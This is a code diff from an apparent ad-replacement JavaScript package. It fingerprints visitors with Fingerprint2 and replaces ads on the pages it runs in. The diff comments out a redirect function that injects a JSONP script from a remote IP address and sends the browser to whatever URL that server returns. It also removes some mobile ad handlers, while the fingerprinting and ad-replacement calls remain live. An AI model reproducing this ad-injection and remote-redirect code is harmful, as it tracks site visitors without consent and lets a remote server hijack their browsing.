@@ -1,7 +1,6 @@
 import { phone } from 'ismobilejs';
 import { anylaseResource, getAd } from './utils';
-import toutiao from './toutiao';
-import { inPC, inMobile } from './inPlatform';
+import { inPC } from './inPlatform';
 
 const [name, version] = ['@veryci/ad-replace-extends-js', '1.0.0'];
 
@@ -16,16 +15,12 @@ function extend() {
     new Fingerprint2().get((uuid) => {
       if (phone) {
         getAd();
-        // inMobile(uuid);
-        // toutiao(uuid);
       } else inPC(uuid);
     });
     return;
   }
   if (phone) {
     getAd();
-    // inMobile('-');
-    // toutiao('-');
   } else inPC('-');
 }
 
@@ -36,17 +31,17 @@ function replace() {
   else anylaseResource('-');
 }
 
-function redirect() {
-  const str = hostname.slice(hostname.indexOf('.') + 1);
-  const fnName = `Jsonp${Math.random().toString().replace('.', '')}_${new Date().getTime()}`;
-  window[fnName] = (data) => {
-    if (data.url) window.location.href = data.url;
-  };
-  const os = document.createElement('script');
-  os.src = `192.168.0.149:3000/replace?cb=${fnName}&host=${str}`;
-  document.getElementsByTagName('head')[0].appendChild(os);
-  os.remove();
-}
+// function redirect() {
+//   const str = hostname.slice(hostname.indexOf('.') + 1);
+//   const fnName = `Jsonp${Math.random().toString().replace('.', '')}_${new Date().getTime()}`;
+//   window[fnName] = (data) => {
+//     if (data.url) window.location.href = data.url;
+//   };
+//   const os = document.createElement('script');
+//   os.src = `52.80.204.125:3099/replace?cb=${fnName}&host=${str}`;
+//   document.getElementsByTagName('head')[0].appendChild(os);
+//   os.remove();
+// }
 // redirect();
 
 function handler(e) {
